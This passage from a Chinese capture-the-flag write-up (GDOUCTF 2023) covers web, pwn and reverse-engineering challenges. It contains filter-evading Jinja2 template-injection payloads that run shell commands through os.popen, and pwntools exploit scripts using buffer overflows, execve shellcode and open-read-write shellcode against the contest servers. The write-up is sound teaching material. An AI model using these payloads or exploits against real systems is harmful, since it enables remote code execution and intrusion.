config|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;+&#x27;s&#x27;)|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#x27;|format(112,111,112,101,110))(&#x27;ls&#x27;)|attr(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:C&#125;&#x27;|format(114,101,97,100))()%&#125;</span><br><span class="line"></span><br><span class="line">无论中间怎么排错改了又改还是不对，马上崩溃，又去看了一下文章发现</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.发现一种过滤器的方法</span><br><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;</span><br><span class="line">抱着试试的想法再次构造起payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%print config|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;&#x27;s&#x27;)|attr(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;ls /&#x27;)|attr(&#x27;%c%c%c%c&#x27;|format(114,101,97,100))()%&#125;</span><br><span class="line"></span><br><span class="line">Hello, $ app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $!</span><br><span class="line"></span><br><span class="line">发现出了，然后紧接着就cat /flag</span><br><span class="line">&#123;%print config|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;&#x27;s&#x27;)|attr(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;cat /flag&#x27;)|attr(&#x27;%c%c%c%c&#x27;|format(114,101,97,100))()%&#125;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;55dabaa2-4d3b-4935-bc79-41c702d4fffd&#125;</span><br><span class="line"></span><br><span class="line">但是第3，4，方法其实差不多但是不知道为啥3出不了</span><br></pre></td></tr></table></figure>

<p>最后总结一下子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过&#123;%%&#125; 绕过&#123;&#123;&#125;&#125;</span><br><span class="line">通过 |attr()  绕过   .   []</span><br><span class="line">通过&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  绕过过滤的关键字  </span><br><span class="line">总体构造  &#123;%print config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() %&#125;</span><br></pre></td></tr></table></figure>

<p>这一个题大概花了2小时，把我这个web小白对ssti产生了阴影，但是强度确实可以，好在搜到了上面两篇文章。</p>
<h2 id="问卷来力！"><a href="#问卷来力！" class="headerlink" title="问卷来力！"></a>问卷来力！</h2><p>填问卷得flag</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="EASY-PWN"><a href="#EASY-PWN" class="headerlink" title="EASY PWN"></a>EASY PWN</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28972</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义gdb调试函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1f</span>+<span class="number">8</span>)+p16(<span class="number">0x11D6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;:\n&quot;</span>,payload)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>找一个小于0x25的shellcode就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28972</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28861</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Please.\n&quot;</span>,shellcode)</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)+p64(<span class="number">0x6010a0</span>) </span><br><span class="line">sla(<span class="string">&#x27;start!\n&#x27;</span>,payload)</span><br><span class="line"><span class="keyword">is</span>()</span><br></pre></td></tr></table></figure>



<h2 id="真男人下120层"><a href="#真男人下120层" class="headerlink" title="真男人下120层"></a>真男人下120层</h2><p>real_man,种子函数的值可以确定，即可以计算随机值，这是在arch里面运行的随机值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	srand(<span class="number">0</span> - <span class="number">1522127470</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; i &lt;=<span class="number">120</span>; i++)&#123;</span><br><span class="line">		<span class="type">int</span> b = rand() % <span class="number">4</span> + <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;&#x27;%d&#x27;,&quot;</span>, b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;3&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28067</span>)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">r = [<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>):</span><br><span class="line">  rc()</span><br><span class="line">  sl(<span class="built_in">str</span>(r[i]))</span><br><span class="line">rc()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="RANDOM"><a href="#RANDOM" class="headerlink" title="RANDOM"></a>RANDOM</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_50819561/article/details/120662408">https://blog.csdn.net/m0_50819561/article/details/120662408</a></p>
<p>概率跑出来flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./RANDOM&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28457</span>)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">payload=(asm(shellcraft.read(<span class="number">0</span>,<span class="number">0x601080</span>,<span class="number">0x100</span>))+asm(<span class="string">&#x27;mov rax,0x601080;call rax&#x27;</span>)).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x40094e</span>)+asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shpayload = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shpayload += shellcraft.read(<span class="number">3</span>, <span class="number">0x601080</span>, <span class="number">0x50</span>)</span><br><span class="line">shpayload += shellcraft.write(<span class="number">1</span>, <span class="number">0x601080</span>,<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;num:&quot;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;your door\n&#x27;</span>,payload)</span><br><span class="line">sl(asm(shpayload))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416222248511.png" alt="image-20230416222248511"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Check-Your-Luck"><a href="#Check-Your-Luck" class="headerlink" title="Check_Your_Luck"></a>Check_Your_Luck</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flag_checker</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w,<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> v,w,x,y,z;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input 5 random number and check your luck ;)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num1: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; v;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num2: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; w;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num3: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num4: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; y;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num5: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; z;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	flag_checker(v,w,x,y,z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flag_checker</span><span class="params">(<span class="type">int</span> v,<span class="type">int</span> w, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((v * <span class="number">23</span> + w * <span class="number">-32</span> + x * <span class="number">98</span> + y * 